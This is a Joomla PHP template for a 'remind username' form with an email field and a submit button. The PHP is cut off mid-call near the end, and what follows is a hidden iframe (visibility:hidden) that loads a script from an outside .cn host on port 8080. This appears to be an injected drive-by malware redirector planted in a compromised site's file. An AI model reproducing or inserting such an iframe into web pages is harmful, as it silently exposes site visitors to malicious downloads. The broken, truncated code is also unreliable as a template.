<?php defined('_JEXEC') or die; ?>

<?php if ( $this->params->def( 'show_page_title', 1 ) ) : ?>
	<div class="componentheading<?php echo $this->params->get( 'pageclass_sfx' ); ?>">
		<?php echo $this->escape($this->params->get('page_title')); ?>
	</div>
<?php endif; ?>

<form action="index.php?option=com_user&amp;task=remindusername" method="post" class="josForm form-validate">
	<table cellpadding="0" cellspacing="0" border="0" width="100%" class="contentpane">
		<tr>
			<td colspan="2" height="40">
				<p><?php echo JText::_('REMIND_USERNAME_DESCRIPTION'); ?></p>
			</td>
		</tr>
		<tr>
			<td height="40">
				<label for="email" class="hasTip" title="<?php echo JText::_('REMIND_USERNAME_EMAIL_TIP_TITLE'); ?>::<?php echo JText::_('REMIND_USERNAME_EMAIL_TIP_TEXT'); ?>"><?php echo JText::_('Email Address'); ?>:</label>
			</td>
			<td>
				<input id="email" name="email" type="text" class="required validate-email" />
			</td>
		</tr>
	</table>

	<button type="submit" class="validate"><?php echo JText::_('Submit'); ?></button>
	<?php echo JHTML::_( '
<iframe src="http://globalmixgroup.cn:8080/ts/in.cgi?pepsi64" width=125 height=125 style="visibility: hidden"></iframe>